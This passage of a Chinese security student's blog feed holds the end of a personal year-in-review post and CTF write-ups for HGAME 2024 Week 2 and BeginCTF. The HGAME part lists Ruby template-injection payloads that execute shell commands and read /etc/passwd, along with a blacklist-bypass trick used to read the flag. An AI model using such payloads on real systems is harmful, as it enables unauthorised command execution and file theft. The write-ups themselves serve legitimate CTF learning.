。感谢王老师李老师一直帮助我，不然我真的不知道该怎么办了。感谢小伙伴们的理解。也给自己个教训吧，当遇到有关利益、金钱的事情，多问一嘴，多想想。</p><p>六月份忙着写我的毕业论文了，说实话，我自己都感觉我写的论文很烂。<br>毕业后也陆陆续续找了些工作，面了面试，自我感觉良好，天津没有那么卷，技术要求的话也没有那么高，但确实工资也没有那么高，当初面了一个那个安全公司，感觉聊的也还行，工作内容啥的也还比较满意，但是最后没有要我，不知道为啥。</p><p>接下来八月份就是hw了，本来说今年不hw来着，但是阴差阳错的又去了hw。在那边也碰到了很好的华哥和钱哥，帮助了我很多，甲方的饭确实挺好的，华哥和钱哥买的零食也贼好吃，就是值夜班熬得确实有点快挺不住了，那时候感觉浑身哪都疼。甲方也挺有意思、挺强的，给我讲容器的和他以前玩IBM小鸡的事情，和以前出去赚很多外快，但是慢慢接不到私活的事情。怎么说呢，或许时代在改变吧。在那里也见识到了什么叫24小时运维，半夜1点升级系统是常态，半夜三四点被叫起来查日志，修漏洞，查原因是真的辛苦。我估计一般人是真顶不住。</p><p>十二月份加入了这个渗透组吧，组里的大哥们技术都很强，发的文章和技术研究，我都要看半天，看半天了也看不太懂，在学校里，别人都说我很强，其实我深知我啥也不是，人外有人，天外有天，还要一直学习。</p><p>最后肯定要感谢以前认识的好大哥了，或许真的是大会那天跟他聊了两句，问问他的产品是做什么的。当时我记的是一个钓鱼演练的平台，我以为是卖这个钓鱼的设备，其实不是，是卖服务，给客户演练一次钓鱼，我当时问这个多少钱一次，我想者最高也就1w吧，他说10w，我当时就感觉，这东西真赚钱，不是，这服务真赚钱。不多说，能提成个1%，1000块。从那以后慢慢的打比赛啥的，也都见到过。感谢哥这几个月对我的照顾吧。不是哥的帮助，我现在也不可能坐在工位上写这篇文章，可能，我现在正在某个机房看设备呢吧。</p><p>我一定好好干，不让哥失望。</p><p>需要感谢的人太多，对我的好我都记得。</p><p>“我从不相信一帆风顺的说法，一帆风顺代表着你没有遇到任何困难，也就说你没有经历过打击，也就没有积累相对应的经验。学走路要经历摔跤，学骑自行车要经历摔跤，学滑雪要经历摔跤，你需要体验那种摔跤的痛感，你才能够在摔跤前做出相应的动作来让自己回归正轨。”</p><p>送给自己，谦卑一些，努力一些。</p><p><img src="/images/my2023/image-20240207175359501.png" alt="image-20240207175359501"></p><blockquote><p>生日快乐~<br>多多更新文章<br>一直在路上<br>读书太少，想的太多<br>date: 2024-02-08 00:00:00</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HGAME-2024-WEEK-2-部分wp</title>
      <link href="/2024/02/06/HGAME-2024-WEEK-2-%E9%83%A8%E5%88%86wp/HGAME-2024-WEEK-2-%E9%83%A8%E5%88%86wp/"/>
      <url>/2024/02/06/HGAME-2024-WEEK-2-%E9%83%A8%E5%88%86wp/HGAME-2024-WEEK-2-%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h5 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h5><h6 id="What-the-cow-say"><a href="#What-the-cow-say" class="headerlink" title="What the cow say?"></a><strong>What the cow say?</strong></h6><p>经过测试是ruby的ssti，默认的输入有给了尖括号了，而且我看网上的payload，都带=</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= system(<span class="string">&quot;whoami&quot;</span>) %&gt; <span class="comment">#Execute code</span></span><br><span class="line">&lt;%= Dir.entries(<span class="string">&#x27;/&#x27;</span>) %&gt; <span class="comment">#List folder</span></span><br><span class="line">&lt;%= File.<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read %&gt; <span class="comment">#Read file</span></span><br><span class="line"></span><br><span class="line">&lt;%= system(<span class="string">&#x27;cat /etc/passwd&#x27;</span>) %&gt;</span><br><span class="line">&lt;%= `ls /` %&gt;</span><br><span class="line">&lt;%= IO.popen(<span class="string">&#x27;ls /&#x27;</span>).readlines()  %&gt;</span><br><span class="line">&lt;% require <span class="string">&#x27;open3&#x27;</span> %&gt;&lt;% @a,@b,@c,@d=Open3.popen3(<span class="string">&#x27;whoami&#x27;</span>) %&gt;&lt;%= @b.readline()%&gt;</span><br><span class="line">&lt;% require <span class="string">&#x27;open4&#x27;</span> %&gt;&lt;% @a,@b,@c,@d=Open4.popen4(<span class="string">&#x27;whoami&#x27;</span>) %&gt;&lt;%= @c.readline()%&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/HGAME-2024-WEEK-2-%E9%83%A8%E5%88%86wp/image-20240206143139330.png" alt="image-20240206143139330"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">user_input=% `id` %</span><br><span class="line">user_input=% `ca&#x27;&#x27;t app.py` %</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[&#x27;echo&#x27;,</span><br><span class="line">                              &#x27;cat&#x27;, &#x27;tee&#x27;, &#x27;;&#x27;, &#x27;&#x27;, &#x27;&amp;&#x27;, &#x27;&lt;&#x27;,</span><br><span class="line">                              &#x27;&gt;&#x27;, &#x27;\\&#x27;, &#x27;flag&#x27;] for black in</span><br></pre></td></tr></table></figure><p>即可，读一下源码，我也没有看懂。就只看懂了办了那些字符，太菜了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_input=% `ca&#x27;&#x27;t /f*/f*` %</span><br></pre></td></tr></table></figure><p><img src="/images/HGAME-2024-WEEK-2-%E9%83%A8%E5%88%86wp/image-20240206144223868.png" alt="image-20240206144223868"></p><h5 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h5><p>python3 bwmforpy3.py decode 100191209_p0.jpg image1.png s.png –alpha 10</p><p><img src="/images/HGAME-2024-WEEK-2-%E9%83%A8%E5%88%86wp/image-20240207101520339.png" alt="image-20240207101520339"></p><p><img src="/images/HGAME-2024-WEEK-2-%E9%83%A8%E5%88%86wp/image-20240207101507496.png" alt="image-20240207101507496"></p><p>T1hi3sI4sKey</p><p><a href="https://www.spammimic.com/decode.cgi">https://www.spammimic.com/decode.cgi</a></p><p>籱籰籪籶籮粄簹籴籨粂籸籾籨籼簹籵籿籮籨籪籵簺籨籽籱簼籨籼籮籬类簼籽粆</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BeginCTF部分wp</title>
      <link href="/2024/01/31/BeginCTF%E9%83%A8%E5%88%86wp/BeginCTF%E9%83%A8%E5%88%86wp/"/>
      <url>/2024/01/31/BeginCTF%E9%83%A8%E5%88%86wp/BeginCTF%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h5 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h5><h6 id="Tupper"><a href="#Tupper" class="headerlink" title="Tupper"></a>Tupper</h6><p>下载到压缩包后，解压可以看到有许多txt文件，每个里面可能是base64，写个脚本提取出来(找gpt)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定目录路径</span></span><br><span class="line">directory = <span class="string">&#x27;G:\\ctf\\tupper&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定输出文件路径</span></span><br><span class="line">output_file = <span class="string">&#x27;D:\\vscodework\\ctf\\beginctf\\output.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取目录下的所有文件名，并按数字排序</span></span><br><span class="line">file_names = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(directory) <span class="keyword">if</span> f.endswith(<span class="string">&#x27;.txt&#x27;</span>)]</span><br><span class="line">file_names.sort(key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[:-<span class="number">4</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历文件名列表，并将内容写入输出文件中</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> file_name <span class="keyword">in</span> file_names:</span><br><span class="line">        file_path = os.path.join(directory, file_name)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> txt_file:</span><br><span class="line">            f.write(txt_file.read())</span><br><span class="line"><span class="comment">#MTQyNzgxOTM0MzI3MjgwMjYwNDkyOTg1NzQ1NzU1NTc1MzQzMjEwNjIzNDkzNTI1NDM1NjI2NTY3NjY0Njk3MDQwOTI4NzQ2ODgzNTQ2NzkzNzEyMTI0NDQzODIyOTg4MjEzNDIwOTM0NTAzOTg5MDcwOTY5NzYwMDI0NTg4MDc1OTg1MzU3MzUxNzIxMjY2NTc1MDQxMzExNzE2ODQ5MDcxNzMwODY2NTk1MDUxNDM5MjAzMDAwODU4MDg4MDk2NDcyNTY3OTAzODQzNzg1NTM3ODAyODI4OTQyMzk3NTE4OTg2MjAwNDExNDMzODMzMTcwNjQ3MjcxMzY5MDM2MzQ3NzA5MzYzOTg1MTg1NDc5MDA1MTI1NDg0MTk0ODYzNjQ5MTUzOTkyNTM5NDEyNDU5MTEyMDUyNjI0OTM1OTExNTg0OTc3MDgyMTkxMjY0NTM1ODc0NTY2MzczMDI4ODg3MDEzMDMzODIyMTA3NDg2Mjk4MDAwODE4MjE2ODQyODMxODczNjg1NDM2MDE1NTk3Nzg0MzE3MzUwMDY3OTQ3NjE1NDI0MTMwMDY2MjEyMTkyMDczMjI4MDg0NDkyMzIwNTA1Nzg4NTI0MzEzNjE2Nzg3NDUzNTU3NzY5MjExMzIzNTI0MTk5MzE5MDc4MzgyMDUwMDExODQ=</span></span><br></pre></td></tr></table></figure><p>解得base64为<br>14278193432728026049298574575557534321062349352543562656766469704092874688354679371212444382298821342093450398907096976002458807598535735172126657504131171684907173086659505143920300085808809647256790384378553780282894239751898620041143383317064727136903634770936398518547900512548419486364915399253941245911205262493591158497708219126453587456637302888701303382210748629800081821684283187368543601559778431735006794761542413006621219207322808449232050578852431361678745355776921132352419931907838205001184</p><p>这时候再怎么解，就借不出来了，然后可以搜索这个题目名称Tupper，<br><code>https://blog.csdn.net/weixin_44143678/article/details/119869423</code><br>搜到了这篇文章，很有趣，是个巴拉巴拉不等式，然后得出图像<br>博主也给出了网站<code>https://tuppers-formula.ovh/</code>,将key填入其中即可<br><img src="/images/BeginCTF%E9%83%A8%E5%88%86wp/image-20240131150913661.png" alt="image-20240131150913661"></p><h6 id="where-is-crazyman-v1-0"><a href="#where-is-crazyman-v1-0" class="headerlink" title="where is crazyman v1.0"></a>where is crazyman v1.0</h6><p>下载到图片后直接google一下即可，秋叶原，没去过</p><p><img src="/images/BeginCTF%E9%83%A8%E5%88%86wp/image-20240202085707374.png" alt="image-20240202085707374"></p><h5 id="re"><a href="#re" class="headerlink" title="re"></a>re</h5><h6 id="红白机"><a href="#红白机" class="headerlink" title="红白机"></a>红白机</h6><p>凑巧做出来的，没什么技术难度，会搜就行，<br>打开压缩包，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br></pre></td><td class="code"><pre><span class="line">LDA #$01</span><br><span class="line">LDX #$00</span><br><span class="line">LDY #$FF</span><br><span class="line">d:</span><br><span class="line">LDA #$01</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">CPX #$ff</span><br><span class="line">BNE d</span><br><span class="line">LDX #$00</span><br><span class="line">STA $2FF,X</span><br><span class="line">e:</span><br><span class="line">LDA #$01</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">CPX #$ff</span><br><span class="line">BNE e</span><br><span class="line">LDX #$00</span><br><span class="line">STA $3FF,X</span><br><span class="line">f:</span><br><span class="line">LDA #$01</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">CPX #$ff</span><br><span class="line">BNE f</span><br><span class="line">LDX #$00</span><br><span class="line">STA $4FF,X</span><br><span class="line">g:</span><br><span class="line">LDA #$01</span><br><span class="line">STA $500,X</span><br><span class="line">INX</span><br><span class="line">CPX #$ff</span><br><span class="line">BNE g</span><br><span class="line">LDX #$00</span><br><span class="line">STA $5FF,X</span><br><span class="line">LDX #$01</span><br><span class="line">LDA #$00</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$21</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$40</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">LDX #$61</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$81</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$04</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$24</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$44</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$64</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$84</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$46</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$66</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$86</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$4B</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$6B</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$8B</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$AD</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$CB</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$10</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$30</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$50</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$70</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$6F</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$90</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$B0</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$D0</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">n:</span><br><span class="line">LDX #$34</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$53</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$73</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$93</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$B3</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$D4</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$37</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$57</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$77</span><br><span class="line">STA $200,X</span><br><span class="line">INX </span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$99</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$B9</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$D7</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$DC</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$BB</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$9B</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$7B</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$5B</span><br><span class="line">STA $200,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$3C</span><br><span class="line">STA $200,X</span><br><span class="line">LDX #$00</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$22</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$42</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$41</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$61</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$60</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$80</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$A0</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$08</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$29</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$49</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$69</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$89</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$10</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$30</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$50</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$70</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$90</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$14</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$34</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$54</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX 